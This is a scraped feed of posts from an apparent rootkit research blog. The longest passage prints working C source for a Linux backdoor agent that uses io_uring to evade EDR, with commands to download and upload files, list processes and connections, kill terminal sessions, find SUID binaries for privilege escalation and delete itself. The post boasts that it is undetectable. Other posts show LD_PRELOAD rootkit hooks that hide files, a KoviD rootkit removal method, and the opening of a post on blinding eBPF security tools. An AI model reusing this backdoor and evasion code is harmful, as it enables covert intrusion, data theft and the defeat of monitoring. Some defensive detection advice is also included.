(where Linux stores login sessions) via read_file_uring, parses the USER_PROCESS records, extracts usernames and their TTYs (terminals), formats a list and sends it back to the client via send_all. It is a way to show who is logged in, remotely and asynchronously.\ncmd_ss:\nvoid cmd_ss(struct io_uring *ring, int sockfd) { char buf[8192]; int ret = read_file_uring(ring, \u0026#34;/proc/net/tcp\u0026#34;, buf, sizeof(buf)); if (ret \u0026lt;= 0) { const char *err = \u0026#34;Error reading /proc/net/tcp\\n\u0026#34;; send_all(ring, sockfd, err, strlen(err)); return; } char out[16384]; size_t out_pos = 0; out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;Local Address Remote Address State UID\\n\u0026#34;); char *line = strtok(buf, \u0026#34;\\n\u0026#34;); line = strtok(NULL, \u0026#34;\\n\u0026#34;); while (line) { unsigned int sl, local_ip, local_port, rem_ip, rem_port, st, uid; sscanf(line, \u0026#34;%u: %8X:%X %8X:%X %X %*s %*s %*s %u\u0026#34;, \u0026amp;sl, \u0026amp;local_ip, \u0026amp;local_port, \u0026amp;rem_ip, \u0026amp;rem_port, \u0026amp;st, \u0026amp;uid); char local_str[32], rem_str[32]; snprintf(local_str, sizeof(local_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (local_ip \u0026amp; 0xFF), (local_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (local_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, local_port); snprintf(rem_str, sizeof(rem_str), \u0026#34;%d.%d.%d.%d:%d\u0026#34;, (rem_ip \u0026amp; 0xFF), (rem_ip \u0026gt;\u0026gt; 8) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 16) \u0026amp; 0xFF, (rem_ip \u0026gt;\u0026gt; 24) \u0026amp; 0xFF, rem_port); out_pos += snprintf(out + out_pos, sizeof(out) - out_pos, \u0026#34;%-22s %-22s %-5X %u\\n\u0026#34;, local_str, rem_str, st, uid); if (out_pos \u0026gt; sizeof(out) - 100) break; line = strtok(NULL, \u0026#34;\\n\u0026#34;); } send_all(ring, sockfd, out, out_pos); } The cmd_ss function provides a sort of mini-netstat, reading /proc/net/tcp to collect active TCP connections. It skips the first line header and processes the rest via sscanf, converting hexadecimal addresses to decimal notation, displaying the IP, port, connection state, and UID of the socket owner. The final output is formatted as text and sent to the client with send_all, all in a way that looks like the real Linux ss command, but using asynchronous kernel file reading.\ncmd_get;\nvoid cmd_get(struct io_uring *ring, int sockfd, const char *path) { struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; int fd; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, path, O_RDONLY, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[256]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } char buf[BUF_SIZE]; ssize_t ret; off_t offset = 0; while (1) { sqe = io_uring_get_sqe(ring); io_uring_prep_read(sqe, fd, buf, sizeof(buf), offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) break; offset += ret; if (send_all(ring, sockfd, buf, ret) \u0026lt;= 0) { break; } } close(fd); } cmd_get is used to transfer files from the server to the client. It tries to open the specified path, and if successful, it reads blocks from the file with io_uring_prep_read and sends these blocks sequentially to the client with send_all. If it fails to open, it sends the client an error message. It is a way to download files from the server remotely.\ncmd_recv:\nvoid cmd_recv(struct io_uring *ring, int sockfd, const char *args) { char remote_path[256]; long expected_size = 0; char buf[BUF_SIZE]; if (sscanf(args, \u0026#34;%255s %ld\u0026#34;, remote_path, \u0026amp;expected_size) != 2 || expected_size \u0026lt;= 0) { const char *msg = \u0026#34;Usage: recv \u0026lt;remote_path\u0026gt; \u0026lt;size\u0026gt;\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); return; } struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); int fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, remote_path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } off_t offset = 0; while (offset \u0026lt; expected_size) { size_t to_read = (expected_size - offset \u0026gt; BUF_SIZE) ? BUF_SIZE : (expected_size - offset); sqe = io_uring_get_sqe(ring); io_uring_prep_recv(sqe, sockfd, buf, to_read, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t received = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (received \u0026lt;= 0) { break; } sqe = io_uring_get_sqe(ring); io_uring_prep_write(sqe, fd, buf, received, offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); io_uring_cqe_seen(ring, cqe); offset += received; } close(fd); } cmd_me:\nvoid cmd_me(struct io_uring *ring, int sockfd) { char buf[128]; pid_t pid = getpid(); char *tty = ttyname(STDIN_FILENO); if (!tty) tty = \u0026#34;(none)\u0026#34;; snprintf(buf, sizeof(buf), \u0026#34;PID: %d\\nTTY: %s\\n\u0026#34;, pid, tty); send_all(ring, sockfd, buf, strlen(buf)); } This command collects information about the running process, such as the PID and associated TTY, using traditional POSIX calls (getpid and ttyname), since io_uring does not support this. It then sends this data to the client using send_all. This is a way of “identifying” the remote agent.\ncmd_ps:\nvoid cmd_ps(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/proc\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /proc\\n\u0026#34;, 21); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;PID CMD\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { if (entry-\u0026gt;d_type != DT_DIR) continue; char *endptr; long pid = strtol(entry-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char comm_path[64]; snprintf(comm_path, sizeof(comm_path), \u0026#34;/proc/%ld/comm\u0026#34;, pid); char name[256]; int ret = read_file_uring(ring, comm_path, name, sizeof(name)); if (ret \u0026gt; 0) { name[strcspn(name, \u0026#34;\\n\u0026#34;)] = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%-7ld %s\\n\u0026#34;, pid, name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(dir); send_all(ring, sockfd, out, pos); } The cmd_ps function walks /proc to list active processes, identifying numerical directories (PIDs), and reading the command name of each process from /proc/[pid]/comm. Reading the process name is done using read_file_uring, but directory scanning does not use io_uring because it is not supported. The output is formatted into a PID + command listing, sent via send_all. It works like a remote “ps”.\ncmd_kick:\nvoid cmd_kick(struct io_uring *ring, int sockfd, const char *arg_raw) { char out[4096]; if (!arg_raw) arg_raw = \u0026#34;\u0026#34;; char *arg = (char *)arg_raw; trim_leading(\u0026amp;arg); if (strlen(arg) == 0) { DIR *d = opendir(\u0026#34;/dev/pts\u0026#34;); if (!d) { snprintf(out, sizeof(out), \u0026#34;Failed to open /dev/pts: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } struct dirent *entry; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Active pts sessions:\\n\u0026#34;); while ((entry = readdir(d)) != NULL) { if (entry-\u0026gt;d_name[0] \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; entry-\u0026gt;d_name[0] \u0026lt;= \u0026#39;9\u0026#39;) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;pts/%s\\n\u0026#34;, entry-\u0026gt;d_name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(d); send_all(ring, sockfd, out, pos); return; } char target_tty[64]; snprintf(target_tty, sizeof(target_tty), \u0026#34;/dev/pts/%s\u0026#34;, arg); DIR *proc = opendir(\u0026#34;/proc\u0026#34;); if (!proc) { snprintf(out, sizeof(out), \u0026#34;Failed to open /proc: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } int found_pid = 0; struct dirent *dent; while ((dent = readdir(proc)) != NULL) { char *endptr; long pid = strtol(dent-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char fd_path[256]; snprintf(fd_path, sizeof(fd_path), \u0026#34;/proc/%ld/fd\u0026#34;, pid); DIR *fd_dir = opendir(fd_path); if (!fd_dir) continue; struct dirent *fd_ent; while ((fd_ent = readdir(fd_dir)) != NULL) { if (fd_ent-\u0026gt;d_name[0] == \u0026#39;.\u0026#39;) continue; char link_path[512]; char link_target[512]; ssize_t link_len; snprintf(link_path, sizeof(link_path), \u0026#34;%s/%s\u0026#34;, fd_path, fd_ent-\u0026gt;d_name); link_len = readlink(link_path, link_target, sizeof(link_target) -1); if (link_len \u0026lt; 0) continue; link_target[link_len] = 0; if (strcmp(link_target, target_tty) == 0) { found_pid = (int)pid; break; } } closedir(fd_dir); if (found_pid) break; } closedir(proc); if (!found_pid) { snprintf(out, sizeof(out), \u0026#34;No process found using %s\\n\u0026#34;, target_tty); send_all(ring, sockfd, out, strlen(out)); return; } if (kill(found_pid, SIGKILL) == 0) { snprintf(out, sizeof(out), \u0026#34;Killed process %d using %s\\n\u0026#34;, found_pid, target_tty); } else { snprintf(out, sizeof(out), \u0026#34;Failed to kill process %d: %s\\n\u0026#34;, found_pid, strerror(errno)); } send_all(ring, sockfd, out, strlen(out)); } This command searches for open sessions in /dev/pts (virtual terminals) and, if the user wishes, forcibly kills a process that is using one of these terminals. It first lists the active terminals, then searches /proc for file descriptors that point to the target terminal, and sends a SIGKILL to the process that is using it. All this by combining POSIX calls (like readlink) and asynchronous sending with send_all.\ncmd_privesc:\nvoid cmd_privesc(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/usr/bin\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /usr/bin\\n\u0026#34;, 23); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Potential SUID binaries:\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { char path[512]; snprintf(path, sizeof(path), \u0026#34;/usr/bin/%s\u0026#34;, entry-\u0026gt;d_name); struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; struct statx stx; io_uring_prep_statx(sqe, AT_FDCWD, path, 0, STATX_ALL, \u0026amp;stx); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res == 0 \u0026amp;\u0026amp; (stx.stx_mode \u0026amp; S_ISUID)) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%s\\n\u0026#34;, path); if (pos \u0026gt; sizeof(out) - 100) break; } io_uring_cqe_seen(ring, cqe); } closedir(dir); send_all(ring, sockfd, out, pos); } This function scans the /usr/bin directory looking for binaries that have the SUID bit enabled, which could be privilege escalation vectors (privesc). For each binary, it does a statx via io_uring and checks the SUID flag. The result is formatted and sent to the client, listing possible privilege exploit candidates.\ncmd_selfdestruct:\nvoid cmd_selfdestruct(struct io_uring *ring, int sockfd) { const char *msg = \u0026#34;Agent will self-destruct\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); char exe_path[512]; ssize_t len = readlink(\u0026#34;/proc/self/exe\u0026#34;, exe_path, sizeof(exe_path)-1); if (len \u0026gt; 0) { exe_path[len] = \u0026#39;\\0\u0026#39;; struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_unlinkat(sqe, AT_FDCWD, exe_path, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Unlink failed: %s\\n\u0026#34;, strerror(-cqe-\u0026gt;res)); send_all(ring, sockfd, err, strlen(err)); } io_uring_cqe_seen(ring, cqe); } exit(0); } How Does the EDR Typically Fail Here? A standard EDR intercepts:\nCalls to open Calls to connect Calls to read and write This monitoring is usually done via hooks or eBPF. What this agent does is \u0026ldquo;bypass\u0026rdquo; these direct calls using io_uring. The kernel handles the I/O without exposing each syscall individually, generating far fewer events to be audited.\nIn essence, the EDR sees fewer \u0026ldquo;door knocks\u0026rdquo; because io_uring sends a batch of operations to the kernel and receives the responses in bulk. This strategy generates much less noise and makes it easier to go unnoticed.\nPractical EDR Bypass With this agent, virtually all network and file operations are handled through io_uring.\nSo an EDR would need to monitor io_uring_enter and understand the full submission/completion flow of events to identify behavior — which is still uncommon in most commercial solutions.\nAdditionally, the traffic goes through a standard HTTPS port (443), making it harder to separate legitimate from malicious traffic.\nBelow is a screenshot from an environment running EDR:\nRingReaper is currently completely FUD (Fully Undetectable) to some EDRs at the time of writing this article. You can do anything, exfiltrate data, read /etc/shadow, access sensitive files, upload content, all RingReaper features remain fully undetected by some EDRs, with evasion working flawlessly.\nPython C2 Server Flow The server.py is quite straightforward:\nWaits for a connection Receives commands from a terminal Sends them to the agent Displays the response It also supports file uploads (put), basically by informing the file size and sending the content sequentially, so the backdoor can reconstruct the file on the target.\nDefensive Reflections As much as using io_uring to bypass defenses is a clever idea;\nThere’s no magic:\nThe kernel still has to execute the io_uring operations. In theory, a well-designed EDR could hook io_uring_enter or instrument internal calls like __io_uring_submit.\neBPF (Berkeley Packet Filter) could be used to trace these operations, but the reality is that few products today deeply monitor io_uring-related syscalls.\nIt’s essential that defenders become familiar with this kind of technique, as it’s likely to become increasingly popular in advanced Linux malware.\nConclusion This agent demonstrates that io_uring, a legitimate Linux feature, can be repurposed to evade syscall-based security solutions.\nIts asynchronous control level enables the construction of discreet, fast, and much harder-to-detect backdoors.\nFor red teamers, t shows the power of modern evasion techniques.\nFor defenders, the takeaway is clear: start studying hooks for io_uring, because it’s only a matter of time before this becomes mainstream in the Linux malware landscape.\nJoin in rootkit researchers\nhttps://discord.gg/66N5ZQppU7 ","permalink":"http://localhost:1313/hacking/evading-linux-edrs-with-io-uring/","summary":"\u003cp\u003eFull source: \u003ca href=\"https://github.com/MatheuZSecurity/RingReaper\"\u003ehttps://github.com/MatheuZSecurity/RingReaper\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#what-is-io_uring\"\u003eWhat is io_uring?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#the-agent\"\u003eThe Agent\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#code-analysis\"\u003eCode Analysis\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#how-does-the-edr-typically-fail-here\"\u003eHow Does the EDR Typically Fail Here?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#practical-edr-bypass\"\u003ePractical EDR Bypass\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#python-c2-server-flow\"\u003ePython C2 Server Flow\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#defensive-reflections\"\u003eDefensive Reflections\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eEach year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as \u003ccode\u003eEDR (Endpoint Detection and Response)\u003c/code\u003e evolve rapidly, making the work of an attacker more challenging.\u003c/p\u003e\n\u003cp\u003eWe, as \u003cstrong\u003ered teamers\u003c/strong\u003e, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\u003c/p\u003e","title":"Red Team Tactics: Evading EDR on Linux with io_uring"},{"content":" Introduction In this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\nLD_PRELOAD LD_PRELOAD is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\nThis technique allows you to \u0026ldquo;hook\u0026rdquo; functions from standard libraries, such as libc, without modifying the program binary, and is therefore widely used both for debugging and for offensive techniques such as user space rootkits.\nWhen an ELF binary is executed, the dynamic linker resolves external function calls using structures like the Procedure Linkage Table (PLT) and Global Offset Table (GOT). By preloading a custom library via LD_PRELOAD, attackers can override functions like readdir() or fopen().\nExample:\nLD_PRELOAD=./rootkitresearchers.so ls /etc/ld.so.preload\nBesides the environment variable, the /etc/ld.so.preload file can also be used to persistently load a library into all processes on the system (including root). This file is read before any environment variable.\nInstalling and Hiding Directory with Rootkit To demonstrate this, I\u0026rsquo;ll use a simple LD_PRELOAD rootkit that hooks the readdir, readdir64, and fopen functions to change the behavior of file and directory listings. The code is shown below.\nFull source\nstruct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This snippet above hooks into the readdir function, which is responsible for listing files in a directory. It uses a pointer orig_readdir to store the address of the original function, retrieved with dlsym(RTLD_NEXT, \u0026ldquo;readdir\u0026rdquo;). Then, in a loop, it calls the original function to get each entry in the directory, but filters out (ignores) entries whose name is equal to \u0026ldquo;secret\u0026rdquo; or \u0026ldquo;ld.so.preload\u0026rdquo;. Thus, these entries never appear to the program that called readdir. When there are no more visible entries, it returns NULL.\nstruct dirent64 *(*orig_readdir64)(DIR *dirp); struct dirent64 *readdir64(DIR *dirp) { if (!orig_readdir64) orig_readdir64 = dlsym(RTLD_NEXT, \u0026#34;readdir64\u0026#34;); struct dirent64 *entry; while ((entry = orig_readdir64(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This is the same logic but for the 64-bit version readdir64.\nFILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); if (strstr(pathname, HIDDEN_FILE) != NULL) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } This fopen hook hides access to specific files by returning a ‘file not found’ error (ENOENT) if the path contains keywords like ‘ld.so.preload’.\nNow let\u0026rsquo;s compile and load it into /etc/ld.so.preload\nOnce loaded, we can test creating a directory named secret, and see if it is hidden from ls.\nAs expected, it was hidden from ls.\n[Theory] Breaking LD_PRELOAD rootkits Here’s something interesting: rootkits that use the LD_PRELOAD technique depend ENTIRELY on the Linux dynamic loader (ld-linux.so) to \u0026ldquo;inject\u0026rdquo; their malicious libraries before the standard system libraries, such as libc. But does this work with all programs?\nThe short and quick answer is: No!\nWhy does LD_PRELOAD work, and why does it sometimes not work?\nLD_PRELOAD, as explained in previous topics, is an environment variable used by ld-linux.so to load extra libraries before others, which allows it to intercept functions from standard libraries (such as libc). In other words, you can replace system functions, such as those that list files or open files, with customized versions, which is perfect for hiding directories or files, for example.\nBut for this to work, the program has to use dynamic loading and depend on ld-linux.so to resolve these functions.\nWhy do static binaries break this idea?\nStatically linked binaries are \u0026ldquo;self-contained\u0026rdquo;. They incorporate all necessary code from their dependencies (such as libc) directly into the executable. As a result, they do not invoke the dynamic linker at runtime, so LD_PRELOAD and /etc/ld.so.preload are ignored.\nIn other words, LD_PRELOAD and the /etc/ld.so.preload file are simply not used by these binaries. This means that rootkits based on these techniques have no effect on them, practically useless.\nThis is one of the most effective ways to bypass these rootkits.\n[Practice] Breaking LD_PRELOAD rootkits With the rootkit loaded in /etc/ld.so.preload, the secret directory is hidden from commands like ls, which depend on libc and the dynamic loader.\nBut it is easy to bypass this, for example: just compile a static binary, like a simple getdents64.c\ngcc getdents64.c -o getdents64 \u0026ndash;static\nWhen using ldd getdents64, we will see that it does not load any dynamic dependencies, unlike ldd /bin/ls, which depends on libc. Since static binaries do not use the dynamic linker, LD_PRELOAD is completely ignored, and so is the rootkit.\nBypassing LD_PRELOAD rootkits is simply very easy.\nConclusion LD_PRELOAD rootkits are actually very good at hiding artifacts in user space, especially because of their simplicity and the fact that they are more stable than LKM rootkits. However, as we have shown in this post, they are not infallible. Simple techniques, such as the use of static binaries, can easily bypass the hooks applied by the rootkit, precisely because they do not depend on the dynamic loader and the external libc.\nIf you enjoyed this content and want to discuss similar techniques, feel free to join our Discord community. See you next time!\nRootkit Researchers\nhttps://discord.gg/66N5ZQppU7\n","permalink":"http://localhost:1313/hacking/bypass-userland-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/JhWCyVT.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\u003c/p\u003e\n\u003ch2 id=\"ld_preload\"\u003eLD_PRELOAD\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eLD_PRELOAD\u003c/code\u003e is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\u003c/p\u003e","title":"Bypassing LD_PRELOAD Rootkits Is Easy"},{"content":" Hello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\nBut first of all, we need to understand how the KoviD works.\nWhat is KoviD? KoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on github.\nNow that we know what KoviD is, we can analyze its code and see how it works, for example, which hooking method it uses.\nFtrace hooking Looking at KoviD sys.c, we can see that it uses a very famous method for hooking syscalls that works very well on newer kernels, which is ftrace (function tracer).\nKeep this information, it will be very useful later in this post.\nSetup KoviD and Loading. According to the kovid readme, before compiling, we need to edit the Makefile to choose a unique file name for \u0026ldquo;/proc/name\u0026rdquo;.\nAfter compiling using make, we can insert it using insmod kovid.ko.\nAfter inserting it, we can see that /proc/mtz had not been enabled and also the module was not hidden after its insertion, so first it is necessary to enable /proc/mtz using kill -SIGCONT 31337 and after that, hide the LKM from lsmod using echo -h \u0026gt;/proc/mtz.\nI also hid the file containing the name mtz, making it invisible in /proc/.\nWell, after enabling /proc/mtz, we can look in dmesg that a random magic word was generated, and this magic word is used to make KoviD visible again.\nIn kovid.c we can see this magic word function being called to make the module visible again.\nDetecting KoviD Well, luckily for us, there is a filesystem that is not very well known, which is tracing, normally on more up-to-date systems, it is already mounted by default, if tracefs is not mounted, just mount it using mount -t tracefs nodev /sys/kernel/tracing, and you can find its documentation at kernel.org.\nAnd in it we can simply view all the LKM functions that are loaded on the machine.\nA very interesting curiosity is that when Kovid is invisible, the trace only shows the addresses of each Kovid function (which in my head still doesn\u0026rsquo;t make much sense, since the /sys/kernel/tracing/available_filter_functions_addrs file was only added in kernel 6.5x, in it we can view the addresses of each function of each loaded lkm too and I am using kernel 5.15.0-119-generic for testing).\nNow, if we make kovid visible again, the name of its functions will appear.\nThis is a very simple way to detect KoviD, and it doesn\u0026rsquo;t require much effort.\nHowever, there is still a way to hide any function/LKM from the tracefs file system, so don\u0026rsquo;t be fooled by that and don\u0026rsquo;t think that if you didn\u0026rsquo;t find anything there that you are safe. Maybe I\u0026rsquo;ll talk about this in a future post.\nYou can also use nitara2 to detect KoviD.\nMaking KoviD hooks useless This part is very interesting and you will learn a really cool trick (if you didn\u0026rsquo;t already know).\nRemember when I mentioned at the beginning of the post that KoviD uses ftrace as a hooking method? So, many people may not know that there is a way to disable ftrace with just one command.\necho 0 \u0026gt; /proc/sys/kernel/ftrace_enabled or sysctl kernel.ftrace_enabled=0 Okay, but what\u0026rsquo;s so great about that? Well, let\u0026rsquo;s go!\nBy temporarily disabling ftrace, all kovid hooks stop working, as it uses ftrace for hooking, but this still does not make kovid visible, but it makes it useless.\nKoviD hides the file containing the name mtz, so /proc/mtz is hidden, and in it is the magic word to make LKM visible again.\nWell now with ftrace disabled we can see that the hidden /proc/mtz has become visible as no kovid hook works as it uses ftrace as syscalls hook.\nSo, after disabling ftrace, just go to /proc/mtz that was visible, get the magic word, and make LKM visible again, being able to remove it.\nAnd this is the easiest way to detect/remove KoviD.\nNotes 1- Of course, this is not 100% effective, as it has a way of hiding from the tracefs filesystem, but against KoviD so far, this works perfectly.\n2- And it is also obvious that in a real scenario, if someone is using KoviD, the name in /proc/name will not be something common like mtz, they would probably use a name that is less \u0026ldquo;imperceptible\u0026rdquo;.\n3- You can make any LKM rootkit that uses ftrace as hooking completely useless, and when you make it useless, you can use that to your advantage and analyze the compromised environment, looking for hidden PIDs, directories/files, etc.\nFinal consideration I hope you enjoyed this post and learned something, if you have any questions, please DM me on Twitter.\n","permalink":"http://localhost:1313/hacking/a-simple-way-to-detect-and-remove-kovid-lkm-rootkit/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/Xd3Y153.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\u003c/p\u003e\n\u003cp\u003eBut first of all, we need to understand how the KoviD works.\u003c/p\u003e\n\u003ch2 id=\"what-is-kovid\"\u003eWhat is KoviD?\u003c/h2\u003e\n\u003cp\u003eKoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on \u003ca href=\"https://github.com/carloslack/KoviD\"\u003egithub\u003c/a\u003e.\u003c/p\u003e","title":"A simple way to detect and remove LKM rootkit KoviD (Outdated)"},{"content":"Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nMe: https://www.linkedin.com/in/mathsalves/\nIntroduction Linux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\nBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\nThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\nAll research is strictly for educational purposes.\nTable of Contents Introduction The eBPF Security Landscape How eBPF Security Works The False Promise of Kernel Observability Understanding the Attack Surface BPF Iterators BPF Ringbuffers Perf Events BPF Maps Bypassing eBPF Security: Technical Implementation Hook Architecture Process and Network Hiding Intercepting BPF Iterators Filtering Ringbuffer Events Blocking Perf Event Submission Manipulating BPF Maps Real-World Bypass Results Falco Evasion Tracee Evasion Additional Tools Conclusion The eBPF Security Landscape How eBPF Security Works eBPF (extended Berkeley Packet Filter) has revolutionized Linux observability and security. Modern security tools leverage eBPF to monitor kernel events in real-time without modifying kernel code or loading traditional kernel modules.\nKey Components:\neBPF Programs: Sandboxed code running in kernel context, attached to various kernel events (syscalls, tracepoints, kprobes) BPF Maps: Kernel data structures for sharing information between eBPF programs and userspace Ringbuffers/Perf Events: Efficient mechanisms for streaming event data from kernel to userspace BPF Iterators: New mechanism for efficiently iterating over kernel objects (processes, network connections, etc.) Security Tools Using eBPF:\nFalco: Runtime security monitoring, detects anomalous behavior Tracee: System call and event tracing for security analysis Tetragon: Policy enforcement and security observability Cilium: Network security and observability GhostScan: Rootkit detection via memory scanning Decloaker: Hidden process detection The False Promise of Kernel Observability The security community believed eBPF solved a fundamental problem: how do you monitor a system that an attacker controls? The answer seemed obvious: use kernel-level observability that attackers cannot evade.\nThis assumption contains a critical flaw.\nThe Fundamental Problem:\neBPF programs execute inside the kernel they are trying to observe, while the detection pipeline depends on kernel → userspace delivery (ring buffers/perf buffers/iterators) and userspace policy engines. If an attacker gains the ability to load a kernel module (via root access and disabled Secure Boot / unenforced module signing), they can modify the kernel\u0026rsquo;s behavior and selectively disrupt what those eBPF programs and collectors are able to see.\nWhy This Matters:\neBPF programs cannot protect themselves from kernel-level manipulation eBPF verifier only ensures memory safety, not security guarantees All eBPF data flow mechanisms (iterators, ringbuffers, maps) are implemented as kernel functions Kernel functions can be hooked via ftrace The moment an attacker has kernel-level access, observability becomes optional.\nUnderstanding the Attack Surface Before we can bypass eBPF security, we need to understand how these tools collect data. Let\u0026rsquo;s examine each mechanism.\nBPF Iterators 